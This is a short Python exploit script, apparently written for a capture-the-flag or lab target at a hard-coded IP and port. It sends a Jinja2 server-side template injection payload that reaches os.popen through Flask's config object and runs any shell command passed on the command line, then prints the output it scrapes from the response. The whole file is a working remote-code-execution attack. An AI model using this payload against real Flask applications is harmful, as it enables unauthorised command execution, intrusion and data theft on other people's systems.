import requests
import sys
from bs4 import BeautifulSoup

server = "154.57.164.66"
port = 31609
url = f"http://{server}:{port}/"
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

if len(sys.argv) < 2:
    print("Usage: python3 exploit.py <command>")
    sys.exit(-1)

cmd = " ".join(sys.argv[1:]).strip()
payload = "{{ config.__class__.from_envvar.__globals__.import_string('os').popen('"+cmd+"').read() }}"

response = requests.get(url + payload, proxies=proxies).text
soup = BeautifulSoup(response, "html.parser")
output = soup.find("str")
print(output.text)
